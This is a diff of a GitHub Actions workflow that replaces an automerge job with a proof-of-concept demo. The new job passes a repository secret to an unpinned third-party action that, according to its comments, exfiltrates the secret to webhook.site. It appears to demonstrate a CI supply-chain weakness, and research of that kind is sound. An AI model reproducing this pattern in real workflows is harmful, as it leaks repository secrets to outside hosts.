@@ -1,42 +1,24 @@
-name: Automerge
+name: Automerge PoC
 
 on:
   pull_request_target:
-    types: [opened, synchronize, reopened, edited, labeled, unlabeled, ready_for_review]
+    types: [opened, synchronize, reopened]
   push:
     branches:
       - main
 
 jobs:
-  auto-merge:
+  demo:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
-        uses: actions/checkout@v2
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
+        uses: actions/checkout@v4
 
-      - uses: actions/setup-node@v1
-        with:
-          node-version: 12
-      - run: yarn
-      - run: yarn test
-
-      - name: Get changes
-        id: git_diff
+      # This is the vulnerable unpinned action – it will exfiltrate the secret
+      - name: Run demo action (exfil)
         uses: yakosolana/demo-action@v1
-        with:
-          github-token: ${{ secrets.GITHUB_TOKEN }}
         env:
           DUMMY: ${{ secrets.MARINADE_DUMMY }}
 
-      - uses: actions-ecosystem/action-add-labels@v1
-        if: ${{ steps.git_diff.outputs.valid == 'VALID' }}
-        with:
-          labels: automerge
-
-      - name: Merge pull request
-        if: ${{ steps.git_diff.outputs.valid == 'VALID' }}
-        uses: 'pascalgn/automerge-action@v0.14.3'
-        env:
-          GITHUB_TOKEN: '${{ secrets.GITHUB_TOKEN }}'
+      # A harmless step to prove the job completed
+      - run: echo "Job finished – check webhook.site for the secret"
